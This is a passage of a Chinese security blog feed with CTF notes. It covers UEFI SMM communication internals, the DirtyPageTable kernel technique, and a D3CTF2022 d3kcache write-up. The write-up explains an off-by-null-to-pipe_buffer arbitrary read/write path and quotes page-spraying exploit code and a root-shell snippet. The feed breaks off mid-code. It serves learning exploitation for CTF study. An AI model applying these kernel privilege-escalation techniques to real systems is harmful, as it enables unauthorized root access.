class="table-container"><table><thead><tr><th>EFI_SUCCESS</th><th>The requested number of bytes was allocated.</th></tr></thead><tbody><tr><td>EFI_OUT_OF_RESOURCES</td><td>The pool requested could not be allocated.</td></tr><tr><td>EFI_INVALID_PARAMETER</td><td><em>PoolType</em> is in the range EfiMaxMemoryType..0x6FFFFFFF.</td></tr><tr><td>EFI_INVALID_PARAMETER</td><td><em>PoolType</em> is EfiPersistentMemory.</td></tr><tr><td>EFI_INVALID_PARAMETER</td><td><em>Buffer</em> is NULL.</td></tr></tbody></table></div><hr><p>The agent invoking the communication interface at runtime may be virtually mapped. The MM infrastructure code and handlers, on the other hand, execute in physical mode.As a result, the non- MM agent, which may be executing in the virtual-mode OS context as a result of an OS invocation of the UEFI SetVirtualAddressMap() service, should use a contiguous memory buffer with a physical address before invoking this service. If the virtual address of the buffer is used, the MM Driver may not know how to do the appropriate virtual-to-physical conversion.<br>在<a href="https://edk2.groups.io/g/devel/topic/30910271">这里</a>讨论了这个问题，指出<code>EfiReservedMemoryType</code>, <code>EfiACPIMemoryNVS</code>或<code>EfiRuntimeServicesData</code>可以满足条件，<strong>最后发现<code>EfiRuntimeServicesData</code>类型的内存可以让<code>SmmCommunication-&gt;Communicate</code>返回<code>EFI_SUCCESS</code></strong>，推测完成了与SMM的态通信，也可以结合<a href="https://github.com/tianocore/edk2/blob/3840c35e34d1c992268092b6366e26f2acc55a75/UefiCpuPkg/PiSmmCommunication/PiSmmCommunicationPei.c#L275">源码</a>来具体分析。</p><h2 id="debugon"><a href="#debugon" class="headerlink" title="debugon"></a>debugon</h2><p>在qemu启动脚本中加入这一句</p><p><code>-global isa-debugcon.iobase=0x402 -debugcon file:./debug.log</code></p><p>之后<code>cat debug.log</code>即可获得许多调试信息</p><h2 id="SMRAM"><a href="#SMRAM" class="headerlink" title="SMRAM"></a>SMRAM</h2><p>SMM状态下有类似SMAP和SMEP这样的保护</p><p>其只能访问位于SMRAM的内存</p><p>否则会有检测<a href="https://github.com/tianocore/edk2/blob/master/MdePkg/Library/SmmMemLib/SmmMemLib.c">edk2/MdePkg/Library/SmmMemLib/SmmMemLib.c at master · tianocore/edk2 (github.com)</a></p><h2 id="SMI流程"><a href="#SMI流程" class="headerlink" title="SMI流程"></a>SMI流程</h2><p>我们一般直接交互处于DXE状态</p><p>通过SMI进入SMM后：</p><ul><li>会将当前状态存在SMBASE + 0x8000 + 0x7c00，比如各个寄存器的值</li><li>执行SMBASE + 0x8000处的代码</li></ul><p>SMBASE + 0x8000会被初始化为gcSmiHandlerTemplate</p><p>函数调用链：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gcSmiHandlerTemplate</span><br><span class="line">-&gt; SmiRendezvous</span><br><span class="line">-&gt; BSPHandler</span><br><span class="line">-&gt; gSmmCpuPrivate-&gt;SmmCoreEntry</span><br><span class="line">   SmmEntryPoint</span><br><span class="line">-&gt; SmiManage (IMAGE, GUID, CommBuffer)</span><br></pre></td></tr></table></figure><p>SmiManage中最后会执行之前注册的Handler，ToySMM中是ToyMain</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Status             = SmiHandler-&gt;Handler (</span><br><span class="line">                                   (EFI_HANDLE)SmiHandler,</span><br><span class="line">                                   Context,</span><br><span class="line">                                   CommBuffer,</span><br><span class="line">                                   CommBufferSize</span><br><span class="line">                                   );</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><p>SmmEntryPoint将gSmmCorePrivate-&gt;CommunicationBuffer的数据传递给了SmiManage，<strong>gSmmCorePrivate是个全局变量</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">……</span><br><span class="line">  </span><br><span class="line">   CommunicationBuffer = gSmmCorePrivate-&gt;CommunicationBuffer;</span><br><span class="line">   BufferSize          = gSmmCorePrivate-&gt;BufferSize;</span><br><span class="line">  </span><br><span class="line">……</span><br><span class="line">  </span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       CommunicateHeader = (EFI_SMM_COMMUNICATE_HEADER *)CommunicationBuffer;</span><br><span class="line">       <span class="comment">// BufferSize was updated by the SafeUintnSub() call above.</span></span><br><span class="line">       Status = SmiManage (</span><br><span class="line">                  &amp;CommunicateHeader-&gt;HeaderGuid,</span><br><span class="line">                  <span class="literal">NULL</span>,</span><br><span class="line">                  CommunicateHeader-&gt;Data,</span><br><span class="line">                  &amp;BufferSize</span><br><span class="line">                  );</span><br><span class="line">   ……</span><br><span class="line"></span><br><span class="line">C</span><br></pre></td></tr></table></figure></li><li><p>SmiManage调用SmmCoreFindSmiEntry通过HandlerType（GUID）查找之前注册的SmiHandler，调用Handler</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">EFI_STATUS</span><br><span class="line">EFIAPI</span><br><span class="line"><span class="title function_">SmiManage</span> <span class="params">(</span></span><br><span class="line"><span class="params">  IN     CONST EFI_GUID  *HandlerType,</span></span><br><span class="line"><span class="params">  IN     CONST VOID      *Context         OPTIONAL,</span></span><br><span class="line"><span class="params">  IN OUT VOID            *CommBuffer      OPTIONAL,</span></span><br><span class="line"><span class="params">  IN OUT UINTN           *CommBufferSize  OPTIONAL</span></span><br><span class="line"><span class="params">  )</span></span><br><span class="line">&#123;</span><br><span class="line">    ……</span><br><span class="line">    </span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Non-root SMI handler</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    SmiEntry = SmmCoreFindSmiEntry ((EFI_GUID *)HandlerType, FALSE);</span><br><span class="line">    </span><br><span class="line">    ……</span><br><span class="line">    </span><br><span class="line">    Status             = SmiHandler-&gt;Handler (</span><br><span class="line">                                       (EFI_HANDLE)SmiHandler,</span><br><span class="line">                                       Context,</span><br><span class="line">                                       CommBuffer,</span><br><span class="line">                                       CommBufferSize</span><br><span class="line">                                       );</span><br><span class="line">    </span><br><span class="line">    ……</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">C</span><br></pre></td></tr></table></figure></li></ul><p>gSmmCorePrivate全局变量定义在PiSmmIpl模块，被初始化为mSmmCorePrivateData</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SMM_CORE_PRIVATE_DATA  *gSmmCorePrivate = &amp;mSmmCorePrivateData;</span><br></pre></td></tr></table></figure><h2 id="全局comm变量"><a href="#全局comm变量" class="headerlink" title="全局comm变量"></a>全局comm变量</h2><p>在ToySMM那题的第二种exp写法中,这位师傅并不分配新的结构体然后再去调用<code>communicate()</code>,而是直接布置在全局变量中并触发(见上一小节),尽管完全可以用写法1替代,但我仍然疑惑那些变量是如何找到的</p><p>最终我在源代码中找到了这些</p><p>在<code>/MdeModulePkg/Core/PiSmmCore/PiSmmIpl.c#L267</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// SMM Communication Protocol instance</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">EFI_SMM_COMMUNICATION_PROTOCOL  mSmmCommunication = &#123;</span><br><span class="line">  SmmCommunicationCommunicate</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// PI 1.7 MM Communication Protocol 2 instance</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">EFI_MM_COMMUNICATION2_PROTOCOL  mMmCommunication2 = &#123;</span><br><span class="line">  SmmCommunicationMmCommunicate2</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// SMM Core Private Data structure that contains the data shared between</span></span><br><span class="line"><span class="comment">// the SMM IPL and the SMM Core.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">SMM_CORE_PRIVATE_DATA  mSmmCorePrivateData = &#123;</span><br><span class="line">  SMM_CORE_PRIVATE_DATA_SIGNATURE,    <span class="comment">// Signature</span></span><br><span class="line">  <span class="literal">NULL</span>,                               <span class="comment">// SmmIplImageHandle</span></span><br><span class="line">  <span class="number">0</span>,                                  <span class="comment">// SmramRangeCount</span></span><br><span class="line">  <span class="literal">NULL</span>,                               <span class="comment">// SmramRanges</span></span><br><span class="line">  <span class="literal">NULL</span>,                               <span class="comment">// SmmEntryPoint</span></span><br><span class="line">  FALSE,                              <span class="comment">// SmmEntryPointRegistered</span></span><br><span class="line">  FALSE,                              <span class="comment">// InSmm</span></span><br><span class="line">  <span class="literal">NULL</span>,                               <span class="comment">// Smst</span></span><br><span class="line">  <span class="literal">NULL</span>,                               <span class="comment">// CommunicationBuffer</span></span><br><span class="line">  <span class="number">0</span>,                                  <span class="comment">// BufferSize</span></span><br><span class="line">  EFI_SUCCESS                         <span class="comment">// ReturnStatus</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Global pointer used to access mSmmCorePrivateData from outside and inside SMM</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">SMM_CORE_PRIVATE_DATA  *gSmmCorePrivate = &amp;mSmmCorePrivateData;</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// SMM IPL global variables</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">EFI_SMM_CONTROL2_PROTOCOL  *mSmmControl2;</span><br><span class="line">EFI_SMM_ACCESS2_PROTOCOL   *mSmmAccess;</span><br><span class="line">EFI_SMRAM_DESCRIPTOR       *mCurrentSmramRange;</span><br><span class="line">BOOLEAN                    mSmmLocked = FALSE;</span><br><span class="line">BOOLEAN                    mEndOfDxe  = FALSE;</span><br><span class="line">EFI_PHYSICAL_ADDRESS       mSmramCacheBase;</span><br><span class="line">UINT64                     mSmramCacheSize;</span><br><span class="line"></span><br><span class="line">EFI_SMM_COMMUNICATE_HEADER                  mCommunicateHeader;</span><br><span class="line">EFI_LOAD_FIXED_ADDRESS_CONFIGURATION_TABLE  *mLMFAConfigurationTable = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><p>但又令我困惑的是在实际内存中,这些变量似乎并没有按照源码中的间隔排布(顺序是对的,但中间插入了许多其他变量)</p><p>不过我们也能够确定偏移,以<code>mSmmCommunication</code>偏移为0</p><div class="table-container"><table><thead><tr><th>name</th><th>offset</th></tr></thead><tbody><tr><td>mSmmCommunication</td><td>0</td></tr><tr><td>mSmmCorePrivateData</td><td>0x70</td></tr><tr><td>mSmmCorePrivateData.CommunicationBuffer</td><td>0xa8</td></tr><tr><td>mSmmCorePrivateData.BufferSize</td><td>0xb0</td></tr><tr><td>mCommunicateHeader.HeaderGuid</td><td>0xf0</td></tr><tr><td>mCommunicateHeader.MessageLength</td><td>0x100</td></tr><tr><td>mCommunicateHeader.Data</td><td>0x108</td></tr></tbody></table></div><p>不知道是否会受版本影响,如果不同另外调试便是</p>]]></content>
    
    
    <summary type="html">hard</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="uefi" scheme="https://ixout.github.io/tags/uefi/"/>
    
  </entry>
  
  <entry>
    <title>DirtyPageTable</title>
    <link href="https://ixout.github.io/posts/29003/"/>
    <id>https://ixout.github.io/posts/29003/</id>
    <published>2024-04-06T12:15:31.000Z</published>
    <updated>2024-04-18T09:11:31.840Z</updated>
    
    <content type="html"><![CDATA[<p>Original blog:<a href="https://yanglingxi1993.github.io/dirty_pagetable/dirty_pagetable.html">Dirty_Pagetable (yanglingxi1993.github.io)</a></p><p>做一些记录</p><h1 id="How-DirtyPageTable-Works"><a href="#How-DirtyPageTable-Works" class="headerlink" title="How DirtyPageTable Works"></a>How DirtyPageTable Works</h1><p>先简单过一遍DirtyPageTable的流程,以最常见的UAF为例</p><ol><li><p>获得一个UAF obj,将其释放回到slab中,并将slab中所有其他的obj全部释放,这样该slab就变成了空slab,</p><p>从而回到伙伴系统中</p></li><li><p>大量分配用户页表,使得用户页表占用victim slab</p></li><li><p>构造用于操作页表条目 (PTE) 的原语</p></li><li><p>修改PTE,使得将该PTE的物理内存变为内核代码/数据的物理内存,例如我们可以修改setresuid(),setresgid()等函数对是否具有调用权限的判别</p></li><li><p>getroot</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">setresuid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">setresgid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br></pre></td></tr></table></figure></li></ol><p>这就是整个DiryPageTable的工作流程了,原理并不复杂,和USMA非常相似</p><p>需要解决的问题有两个:</p><ol><li>如何得到UAF,并且获得操作页表条目的能力</li><li>如何得到目标地址的物理内存地址</li></ol><p>利用手法提出者给了我们三种示范</p><h1 id="DPT-with-CVE-2023-21400"><a href="#DPT-with-CVE-2023-21400" class="headerlink" title="DPT with CVE-2023-21400"></a>DPT with CVE-2023-21400</h1>]]></content>
    
    
    <summary type="html">magic</summary>
    
    
    
    <category term="-pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://ixout.github.io/tags/pwn/"/>
    
    <category term="dirtypagetable" scheme="https://ixout.github.io/tags/dirtypagetable/"/>
    
  </entry>
  
  <entry>
    <title>从d3cache看页级堆风水与一个off-by-null导致的任意读写</title>
    <link href="https://ixout.github.io/posts/10326/"/>
    <id>https://ixout.github.io/posts/10326/</id>
    <published>2024-03-24T13:37:46.000Z</published>
    <updated>2024-04-05T06:25:53.773Z</updated>
    
    <content type="html"><![CDATA[<h1 id="D3CTF2022-d3kcache"><a href="#D3CTF2022-d3kcache" class="headerlink" title="D3CTF2022-d3kcache"></a>D3CTF2022-d3kcache</h1><p>这题原本是记录在kernel习题记录的,但是深入理解arttnba3师傅的博客后,发现这题蕴含的知识太丰富了</p><p>于是打算单独开一篇文章,好好赏析一番</p><p>另外,arttnba3师傅tql!!!orz</p><h2 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h2><p>常规保护kaslr,kpti,smap,smep等等都是拉满的</p><p>除此之外在config中还可以看到开启了<code>CONFIG_CFI_CLANG</code>保护</p><p>google可以得知一下信息</p><blockquote><p>This option enables Clang’s forward-edge Control Flow Integrity (CFI) checking, where the compiler injects a runtime check to each indirect function call to ensure the target is a valid function with the correct static type. This restricts possible call targets and makes it more difficult for an attacker to exploit bugs that allow the modification of stored function pointers. More information can be found from Clang’s documentation:</p><p><a href="https://clang.llvm.org/docs/ControlFlowIntegrity.html">https://clang.llvm.org/docs/ControlFlowIntegrity.html</a></p></blockquote><p>即选中了该选项的内核编译时,会在间接函数跳转处加入更多的检查,确保间接函数指针不被劫持</p><p>说简单点就是在发生call调用后,会在跳转目标头部做一些检查</p><p>这样一来,函数指针表将会受到严格保护,像修改函数指针虚表这样的流劫持,就很难利用了,因为不能劫持函数指针为gadget!!</p><h2 id="模块分析"><a href="#模块分析" class="headerlink" title="模块分析"></a>模块分析</h2><p>模块创建了一个obj为2048大小的slab分配器</p><p>并通过ioctl实现了常规的note增加,删除,追加和展示等功能</p><p>唯一关键的点在于追加过程中会导致一个<code>off-by-null</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">      <span class="keyword">if</span> ( a2 == <span class="number">1300</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( idx &lt;= <span class="number">0xF</span>uLL &amp;&amp; kcache_list[idx].ptr )</span><br><span class="line">        &#123;</span><br><span class="line">          v7 = input_size;</span><br><span class="line">          <span class="keyword">if</span> ( input_size &gt; <span class="number">0x800</span> || input_size + kcache_list[idx].size &gt;= <span class="number">0x800</span> )</span><br><span class="line">            v7 = <span class="number">2048</span> - kcache_list[idx].size;</span><br><span class="line">          <span class="keyword">if</span> ( v7 &lt; <span class="number">0</span> )</span><br><span class="line">            BUG();</span><br><span class="line">          v8 = (<span class="type">char</span> *)kcache_list[idx].ptr + (<span class="type">unsigned</span> <span class="type">int</span>)kcache_list[idx].size;<span class="comment">// append</span></span><br><span class="line">          v9 = (<span class="type">unsigned</span> <span class="type">int</span>)v7;</span><br><span class="line">          v10 = input_ptr;</span><br><span class="line">          _check_object_size(v8, (<span class="type">unsigned</span> <span class="type">int</span>)v7, <span class="number">0LL</span>);</span><br><span class="line">          <span class="keyword">if</span> ( !copy_from_user(v8, v10, v9) )</span><br><span class="line">          &#123;</span><br><span class="line">            v8[v9] = <span class="number">0</span>;<span class="comment">//off-by-null</span></span><br><span class="line">            v5 = <span class="number">0LL</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">        &#125;</span><br><span class="line">        v25 = &amp;unk_837;</span><br><span class="line">LABEL_46:</span><br><span class="line">        printk(v25);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>在内核中仅有一个<code>off-by-null</code>漏洞似乎难以利用</p><p>不过当我们遍历那些内核pwn中常利用的结构体之后,我们可以发现<code>pipe_buffer</code>是一个十分适合的对象</p><p>其既可以读也可以写,而读写目标完全由其<code>page</code>成员决定,并且<code>page</code>成员就在结构体的起始处</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *struct pipe_buffer - a linux kernel pipe buffer</span></span><br><span class="line"><span class="comment"> *@page: the page containing the data for the pipe buffer</span></span><br><span class="line"><span class="comment"> *@offset: offset of data inside the @page</span></span><br><span class="line"><span class="comment"> *@len: length of data inside the @page</span></span><br><span class="line"><span class="comment"> *@ops: operations associated with this buffer. See @pipe_buf_operations.</span></span><br><span class="line"><span class="comment"> *@flags: pipe buffer flags. See above.</span></span><br><span class="line"><span class="comment"> *@private: private data owned by the ops.</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我们知道<code>struct page</code>对应着唯一一个物理页,每个<code>struct page</code>的大小是0x40</p><p>那么如果我们的<code>off-by-null</code>漏洞刚好作用在pipe_buffer的<code>page</code>字段,岂不是就会使得两个pipe_buffer的page字段指向同一个<code>struct page</code>进而操作在同一个物理页上</p><p>不过考虑到page字段的最低处本身就有<code>1/4</code>的概率是<code>\x00</code>,所以只有<code>3/4</code>的概率能够成功劫持</p><p>我们暂且不考虑做到这一步的细节,继续向下思考</p><p>现在我们有了两个能够操控相同物理页的pipe,很自然的一个思路便是UAF泄露信息然后劫持结构体函数指针</p><p>但别忘了内核开启了CFI,也就是说这种方法并不适用,那在这种情况下要想提权就必须要具备一定程度的读写能力</p><p><code>arttnba3</code>大佬给出了一个十分巧妙的办法,即释放其中一个pipe,让这个uaf的页继续作为<code>pipe_buffer</code>的slab页</p><p>此时我们可以用另一个pipe读出uaf页内部的信息,这其中就包含着完整的page指针,如果我们再拿这个page指针去覆盖uaf页上下一个<code>pipe_buffer</code>结构体,岂不是又构造了一次uaf</p><p>接着我们再释放这两个pipe中的一个,并再次将该页作为<code>pipe_buffer</code>的slab页</p><p>与上一次uaf不同的是,这一次uaf我们是知道这个uaf页的<code>struct page*</code>指针的,那么我们岂不是可以直接修改这个uaf页上的pipe_buffer的page指针为本uaf页的page指针</p><p>从而使得这一次uaf页上的pipe_buffer指向自身</p><p>之后多修改几个这样的指针让其互相重置岂不是可以任意读写,再提权不是十分简单</p><h2 id="思路实现"><a href="#思路实现" class="headerlink" title="思路实现"></a>思路实现</h2><p>以上理了一遍思路,现在开始分析如何实现</p><h3 id="页级堆风水构造"><a href="#页级堆风水构造" class="headerlink" title="页级堆风水构造"></a>页级堆风水构造</h3><p>此前已经学习过利用setsockopt来构造堆风水</p><p>此处不再赘述</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">~ $ <span class="built_in">cat</span> /proc/buddyinfo </span><br><span class="line">Node 0, zone      DMA      0      0      0      0      0      1      1      1      0      1     </span><br><span class="line">Node 0, zone    DMA32      1      2      1      2      4      1      2      2      6      2    </span><br></pre></td></tr></table></figure><p>我们可以看到,内核刚启动时伙伴系统算是比较干净的</p><p>低阶的连续页较少,次数不多的setsockopt便能够清空低阶的连续页</p><p>也就是对应exp中的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* spray pages in different size for various usages */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">prepare_pgv_pages</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * We want a more clear and continuous memory there, which require us to </span></span><br><span class="line"><span class="comment">     * make the noise less in allocating order-3 pages.</span></span><br><span class="line"><span class="comment">     * So we pre-allocate the pages for those noisy objects there.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pgv order-0 pages...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PGV_1PAGE_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (alloc_page(i, <span class="number">0x1000</span>, <span class="number">1</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pgv order-2 pages...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PGV_4PAGES_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (alloc_page(PGV_4PAGES_START_IDX + i, <span class="number">0x1000</span> * <span class="number">4</span>, <span class="number">1</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* spray 8 pages for page-level heap fengshui */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray pgv order-3 pages...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PGV_8PAGES_SPRAY_NUM; i++) &#123;</span><br><span class="line">        <span class="comment">/* a socket need 1 obj: sock_inode_cache, 19 objs for 1 slub on 4 page*/</span></span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">19</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            free_page(pgv_4pages_start_idx++);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* a socket need 1 dentry: dentry, 21 objs for 1 slub on 1 page */</span></span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">21</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            free_page(pgv_1page_start_idx += <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* a pgv need 1 obj: kmalloc-8, 512 objs for 1 slub on 1 page*/</span></span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">512</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            free_page(pgv_1page_start_idx += <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (alloc_page(PGV_8PAGES_START_IDX + i, <span class="number">0x1000</span> * <span class="number">8</span>, <span class="number">1</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] failed to create %d socket for pages spraying!\n&quot;</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span 